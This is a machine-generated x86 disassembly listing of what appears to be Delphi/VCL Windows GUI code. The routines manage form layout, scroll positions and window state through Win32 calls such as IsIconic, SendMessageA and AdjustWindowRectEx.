cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_4430fc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_457e00
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4430c0
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4430c0
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_417d38
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43f320
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4583ef
mov eax [ ebp - 0x10 ]
call sub_40316c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4576f8
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_417e94
xor ecx ecx
mov edx 0xb03e
call sub_440d98
inc ebx
dec esi
jne r-xdata
sub_45841c
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_457f50
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_457f50
mov eax ebx
call sub_4583f8
jmp r-xdata
sub_458478
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_446754
test al al
je r-xdata
xor eax eax
push ebp
push sub_458563
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_457a18
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_457a18
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_458084
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_458084
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_458084
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_458084
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_458084
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_458084
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_458588
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_43f6c8
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43f6f4
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_43f6c8
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43f6f4
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43f5b4
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_457e00
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43f5b4
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_43f5f8
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_457e00
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_43f5b4
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_457e00
mov eax ebx
call sub_43f5b4
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_43f5f8
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_43f5f8
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_457e00
mov eax ebx
call sub_43f5f8
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_4586dc
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_457e00
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_457e00
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call sub_4063e4
mov edx eax
mov eax ebp
call sub_457f50
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call sub_4063e4
mov edx eax
mov eax ebp
call sub_457f50
sub_458780
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4586dc
mov ecx edi
mov edx esi
mov eax ebx
call sub_445f5c
pop edi
pop esi
pop ebx
retn
sub_4587a8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_458812
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4449b8
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458819
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_458819
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_458851
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4583f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458858
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_458858
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_458478
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_4588cc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43f5f8
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_428c48
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_43f5b4
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_428c48
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_416a88
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_442438
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45893c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45899d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4457cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4589a4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_4589cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45819c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_43f36c
mov edx 0x29
mov eax esi
call sub_43f390
mov [ esi + 0x220 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_458a2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_458250
xor eax eax
mov al [ ebx + 0x220 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_458a98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_445a68
pop esi
pop ebx
retn
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
mov eax ebx
call sub_44396c
sub_458ac4
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_458c28
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_458c08
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_4030b4
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_403490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458c0f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_458bd0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_417c54
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4030bc
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
call sub_4038f8
sub_458c50
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403368
and [ ebx + 0x2f4 ] 0xdf
sub_458c88
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_45819c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_43f320
xor edx edx
mov eax ebx
call sub_43f344
mov edx 0x140
mov eax ebx
call sub_43f36c
mov edx 0xf0
mov eax ebx
call sub_43f390
mov dl 0x1
mov eax [ r-xdata ]
call sub_4281dc
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4595a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_422348
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_43e78c
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_4030b4
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_459908
xor edx edx
mov eax ebx
call sub_43fd74
xor edx edx
mov eax ebx
call sub_43fcdc
mov dl 0x1
mov eax ebx
call sub_446590
mov edx ebx
mov eax [ rw-data ]
call sub_45df6c
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_458e01
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_41e978
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_418030
xor edx edx
mov eax ebx
call sub_41b344
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_45ce14
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_458e6c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4034f8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_458f36
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45b790
mov eax [ ebp - 0x4 ]
call sub_446754
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45dfa4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_40316c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_40316c
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d3ac
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_458214
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458f3d
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_458f50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_458f91
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_459908
sub_458f96
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403368
test al al
jne r-xdata
call sub_403974
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403920
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_459908
sub_458fcc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_45900d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45902c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_441ca0
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403368
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_45b2d4
sub_459068
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43f080
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_417d38
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_45a6cc
mov edx esi
mov eax ebp
call sub_418030
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_45a6a4
mov edx esi
mov eax edi
call sub_45a6cc
jmp r-xdata
xor edx edx
mov eax edi
call sub_45a680
sub_459174
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_442c64
xor edx edx
push ebp
push sub_4593ca
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4423c0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43f5cc
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43f610
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_4594fc
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_440d98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4593d1
mov eax [ ebp - 0x4 ]
call sub_442c6c
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4586dc
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_445f14
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4586dc
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_445f14
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_421bec
push eax
call sub_4063e4
mov edx eax
mov eax esi
call sub_421bf4
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call sub_4063e4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call sub_4063e4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call sub_4063e4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call sub_4063e4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_4593d9
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44370c
push 0x0
push 0x0
push ebx
push sub_4594e0
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_4594ac
push ebx
push sub_4594c4
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_45948b
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41ba3c
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_43fcdc
sub_459517
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4586dc
mov ecx edi
mov edx esi
mov eax ebx
call sub_445f14
mov eax ebx
call sub_459600
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_421c90
push eax
call sub_4063e4
mov edx eax
mov eax ebp
call sub_421cac
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43f5f8
mov ebp eax
push edi
push esi
mov eax ebx
call sub_43f5b4
push eax
call sub_4063e4
mov edx eax
mov eax ebx
call sub_4598a8
push edi
push esi
push ebp
call sub_4063e4
mov edx eax
mov eax ebx
call sub_4598d8
sub_4595a4
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_446450
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_446754
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45b904
push eax
push 0x1
push 0x80
mov eax ebx
call sub_446450
push eax
call SendMessageA
pop ebx
retn
sub_459638
push ebx
mov ebx eax
mov eax ebx
call sub_45a554
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_4596cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_446450
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_446518
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_446450
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_446450
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_459754
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
